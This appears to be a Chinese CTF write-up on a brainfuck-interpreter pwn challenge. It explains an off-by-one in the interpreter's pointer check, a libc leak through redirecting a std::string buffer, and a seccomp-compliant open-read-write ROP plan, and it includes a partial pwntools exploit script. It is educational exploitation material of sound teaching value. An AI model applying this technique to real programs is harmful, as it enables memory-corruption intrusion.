---
title: VMPWN的入门级别题目详解（二）
url: https://www.secpulse.com/archives/202902.html
source: 安全脉搏
date: 2023-08-05
fetch_date: 2025-10-04T12:00:19.646720
---

# VMPWN的入门级别题目详解（二）

[![](https://www.secpulse.com/wp-content/themes/secpulse2017/img/logo-header.png)](https://www.secpulse.com "安全脉搏")

* [首页](https://www.secpulse.com/)
* [分类阅读](https://www.secpulse.com/archives/category/category)

  #### 脉搏文库

  - [内网渗透](https://www.secpulse.com/archives/category/articles/intranet-penetration)
  - |
  - [代码审计](https://www.secpulse.com/archives/category/articles/code-audit)
  - |
  - [安全文献](https://www.secpulse.com/archives/category/articles/sec-doc)
  - |
  - [Web安全](https://www.secpulse.com/archives/category/articles/web)
  - |
  - [移动安全](https://www.secpulse.com/archives/category/articles/mobile-security)
  - |
  - [系统安全](https://www.secpulse.com/archives/category/articles/system)
  - |
  - [工控安全](https://www.secpulse.com/archives/category/articles/industrial-safety)
  - |
  - [CTF](https://www.secpulse.com/archives/category/exclusive/ctf-writeup)
  - |
  - [IOT安全](https://www.secpulse.com/archives/category/iot-security)
  - |

#### 安全建设

+ [业务安全](https://www.secpulse.com/archives/category/construction/businesssecurity)
+ |
+ [安全管理](https://www.secpulse.com/archives/category/construction/securityissue)
+ |
+ [数据分析](https://www.secpulse.com/archives/category/construction/bigdata)
+ |

#### 其他

+ [资讯](https://www.secpulse.com/archives/category/news)
+ |
+ [漏洞](https://www.secpulse.com/archives/category/vul)
+ |
+ [工具](https://www.secpulse.com/archives/category/tools)
+ |
+ [人物志](https://www.secpulse.com/archives/category/people)
+ |
+ [区块链安全](https://www.secpulse.com/archives/category/exclusive/block_chain_security)
+ |
+ [安全招聘](https://www.secpulse.com/archives/category/hiring)
+ |

- [安全问答](https://www.secpulse.com/newpage/question_list)
- [金币商城](https://www.secpulse.com/shop?donotcachepage=c010349fd98847cb9d6e07d3cbc19288)
- [安全招聘](https://www.secpulse.com/archives/category/hiring)
- [活动日程](https://www.secpulse.com/newpage/activity)
- [live课程](https://www.secpulse.com/live)
- [企业服务](https://duoyinsu.com/service.html)
- [插件社区](https://x.secpulse.com/)

小程序

![脉搏小程序](https://www.secpulse.com/wp-content/themes/secpulse2017/img/wxchat.jpg)
[登录](https://www.secpulse.com/user_login)
|
[注册](https://www.secpulse.com/user-register)

# VMPWN的入门级别题目详解（二）

[CTF](https://www.secpulse.com/archives/category/exclusive/ctf-writeup)

[蚁景网安实验室](https://www.secpulse.com/newpage/author?author_id=37244)
![]( https://www.secpulse.com/wp-content/themes/secpulse2017/img/renzheng2.png)

2023-08-04

22,346

### 实验四 VMPWN4

#### 题目简介

这道题应该算是虚拟机保护的一个变种，是一个解释器类型的程序，何为解释器？解释器是一种计算机程序，用于解释和执行源代码。解释器可以理解源代码中的语法和语义，并将其转换为计算机可以执行的机器语言。与编译器不同，解释器不会将源代码转换为机器语言，而是直接执行源代码。即，这个程序接收一定的解释器语言，然后按照一定的规则对其进行解析，完成相应的功能，从本质上来看依然是一个虚拟机。

这个程序是一个brainfuck的解释器，brainfuck的语法如下所示：

![](https://pic.imgdb.cn/item/64a7f5e71ddac507cc8d4442.jpg)

将这些语法翻译为c代码如下所示：

![](https://pic.imgdb.cn/item/64a7f5f41ddac507cc8d6e36.jpg)

#### 题目保护检查

使用checksec来检查程序开启了哪些保护机制

![](https://pic.imgdb.cn/item/64a7f5de1ddac507cc8d289b.jpg)

所有保护全部开启使用seccomp-tools检查程序是否开启了沙箱

![](https://pic.imgdb.cn/item/64a7f6de1ddac507cc906361.jpg)

只允许open、openat、read、write、brk等少数系统调用，也就是说我们不能通过执行system(“/bin/sh”)或者execve系统调用来拿到shell了。

#### 漏洞分析

使用IDA pro打开这个程序查看伪代码

![](https://pic.imgdb.cn/item/64a7f6061ddac507cc8dac2d.jpg)

![](https://pic.imgdb.cn/item/64a7f60e1ddac507cc8dc1a5.jpg)

看到std::cout以及std::string等函数，可以看出来这个程序是用c++进行编写的，相比于C语言的程序，C++的程序反编译之后分析起来难度会大一些。

【---- 帮助网安学习，以下所有学习资料免费领！领取资料加 we~@x：yj009991，备注 “安全脉搏” 获取！】
① 网安学习成长路径思维导图
② 60 + 网安经典常用工具包
③ 100+SRC 漏洞分析报告
④ 150 + 网安攻防实战技术电子书
⑤ 最权威 CISSP 认证考试指南 + 题库
⑥ 超 1800 页 CTF 实战技巧手册
⑦ 最新网安大厂面试题合集（含答案）
⑧ APP 客户端安全检测指南（安卓 + IOS）

分析一波`sub_1EA2`函数![L8arzn.png](https://s1.ax1x.com/2022/04/15/L8arzn.png)在a1+0x400处创建一个string类，后面的`sub_1FAA`，`sub_1F72`很复杂，看不明白，应该是初始化的函数。

然后在 sub\_154B 函数中

![](https://pic.imgdb.cn/item/64a7f61d1ddac507cc8df29b.jpg)

这里就是沙箱开启函数，我们一开始用 seccomp-tools 分析程序得到的沙箱规则就是在这个函数中设置的，对程序的系统调用功能进行了种种限制。

接着输入 code，每次输入 1 字节，然后将这 1 字节拼接到 string 中， 在这里我们可以动态调试一下输入过程，因为 string 是一个类，其内部有其他成员。我们将断点下载 while 循环结束之后，即读取完了 code，我们首先输入 5 个'>',string 类在 rbp-0x40，我们查看其中内容：

![](https://pic.imgdb.cn/item/64a7f6261ddac507cc8e0b60.jpg)

前8个字节是一个指针，指向我们输入的code存放的地址，第2个8字节是输入的字节数，后面的就是我们输入的code，这里我们只输入了5个字节，直接在存在了栈中。我们多输入一些，大于0x10个字符

![L8ByhF.png](https://s1.ax1x.com/2022/04/15/L8ByhF.png)![L8DX24.png](https://s1.ax1x.com/2022/04/15/L8DX24.png)

前8个字节变为了堆地址，我们输入的数据被存入了堆中，第2个8字节依然书我们输入的字节数，第3个8字节0x1e，应该是剩余可用空间，0x13+0x1e=0x31。总的来说，如果输入字符数小于0x10，string类的大概成员应该如下

```
struct string
{
    char *data;
    int64_t size;
    char data[0x10];
    ...
}
```

如果大于0x10则为如下

```
struct
{
    char *buf;
    int64_t size;
    int64_t capacity;
    char tmp_data[8];
    ...
}
```

继续分析程序

![](https://pic.imgdb.cn/item/64a7f64c1ddac507cc8e7ab7.jpg)

中间这一段 for 循环应该是遍历所有输入的 code，寻找[和],也就是寻找程序的边界，为什么是寻找程序的边界，可以再看一下 brainfuck 解释为 c 语言之后的效果。[]所包裹起来的 code，就是 while 循环之内要执行的代码。从这个 for 循环往下，就是对 brainfuck 的解释代码，会依次判断每个字符的值，并进行相应的操作。

首先看到对`>`的操作![L8yoqA.png](https://s1.ax1x.com/2022/04/15/L8yoqA.png)会对v19进行+1操作，v19是啥呢？![L863RO.png](https://s1.ax1x.com/2022/04/15/L863RO.png)s是最开始初始化的时候传入的一个长度为0x400的数组，这里将v19赋值为s数组的地址，每当解析到>时，就将v19往后移动一个字节，然后对v19进行判断![L8cwnJ.png](https://s1.ax1x.com/2022/04/15/L8cwnJ.png)在if判断中存在问题，当v19指针大于string指针是退出，也就是说v19可以等于string指针，即v19可以指向string的第一个字节，存在off-by-one。如下图![L82liq.png](https://s1.ax1x.com/2022/04/15/L82liq.png)v19可以指向画框的1字节。

后续的其他操作就都和最开始贴出来的brainfuck语法一样了，也没有漏洞。

接下来开始利用漏洞。

第一步还是得先泄露libc地址。泄露方法是通过将v19指向string的第一字节，也就是buf指针的最后1字节。![L8RXuD.png](https://s1.ax1x.com/2022/04/15/L8RXuD.png)在`0x7fffffffde68`处就是main函数的返回地址，我们将buf指针的最后1字节修改为68，这样buf就会指向返回地址。在程序的最后，会将string的数据输出![L8WEDg.png](https://s1.ax1x.com/2022/04/15/L8WEDg.png)而此时string的buf已经被我们指向了返回地址，输出时就会泄露出libc\_start\_main的地址。在这里我们需要注意，想要buf指针能够指向栈中，我们输入的数据不能超过0x10个字节，而v19和string相差多少呢？![L8fARx.png](https://s1.ax1x.com/2022/04/15/L8fARx.png)v19是指向s的，s和string相差了0x400的距离，所以我们需要将v19增加0x400才行，但如果我们输入0x400个>，又会调用malloc，这样buf就会变成堆地址。所以这里就得了解brainfuck语法，使用[]可以达成类似于循环的效果。只需要`+[>+],`这5个字符就可以一直循环增加v19指针，并在v19指向string的第1字节时自动停止，然后往string的第1字节写入1字节的数据，换成c的语法如下

```
++*ptr;
while(*ptr)
{
        ptr++;
        ++*ptr;
}
```

这看起来是一个死循环，为啥能够自动在指向string的第1个字节时自动停止呢？这是因为，当执行完>使得v19指向string后，接下来会执行+使得string的buf指针+1，变成了下图所示：![LGnwfU.png](https://s1.ax1x.com/2022/04/15/LGnwfU.png)于是，原本要取`]`，因为指针+1，就会取到`,`，从而跳出循环。还有一点就是，因为aslr的缘故，栈地址会一直改变，所以泄露libc地址需要多试几次才能成功。拿到libc地址之后，就可以进行利用了，由于此时string的buf指针指向的是返回地址，我们再次输入code的时候就会往返回地址上写，所以我们可以构造好orw的rop链，直接写入返回地址，然后当我们结束main函数的时候就会执行orw链。另外，还有需要注意的地方，在程序开头和结尾，有这么几个函数开头![LBncjI.png](https://s1.ax1x.com/2022/04/19/LBncjI.png)结尾![LBnoCQ.png](https://s1.ax1x.com/2022/04/19/LBnoCQ.png)开头的应该是构造函数，结尾的应该是析构函数。在漏洞利用中我们将string的buf指向了返回地址，如果我们在这个时候退出了while循环，执行析构函数时就会报错，所以我们在布置完orw链后还需要对string的buf进行修正，让它指向正确的位置。

#### 利用脚本

```
from pwn import *
context.log_level='debug'
global io
libc=ELF('./libc.so.6')

def debug(addr,PIE=True):
    if PIE:
        text_base = int(os.popen("pmap {}| awk '{{print $1}}'".format(io.pid)).readlines()[1], 16)
        gdb.attach(io,'b *{}'.format(hex(text_base+addr)))
    else:
        gdb.attach(io,"b *{}".format(hex(addr)))

def pwn():
    payload = '+[>+],'
    io.recvuntil('enter your code:\n')

    io.sendline(payload)
    io.recvuntil('running....\n')
    io.send(p8(0xd8))
    io.recvuntil("your code: ")
    libc_base = u64(io.recvuntil('\x7f',timeout=0.5)[-6:].ljust(8,'\x00')) - 231 - libc.sym['__libc_start_main']
    if libc_base>>40!=0x7f:
        raise Exception("leak error!")
    log.success('libc_base => {}'.format(hex(libc_base)))
    pop_rdi_ret=libc_base+0x000000000002155f
    pop_rsi_ret=libc_base+0x0000000000023e6a
    pop_rdx_ret=libc_base+0x0000000000001b96
    open_addr=libc_base+libc.symbols['open']
    read_addr=libc_base+libc.symbols['read']
    write_addr=libc_base+libc.symbols['write']
    log.success('open_addr => {}'.format(hex(open_addr)))
    log.success('read_addr => {}'.format(hex(read_addr)))
    log.success('write_addr => {}'.format(hex(write_addr)))

    flag_str_addr=(libc_base+libc.symbols['__free_hook'])&0xfffffffffffff000

  ...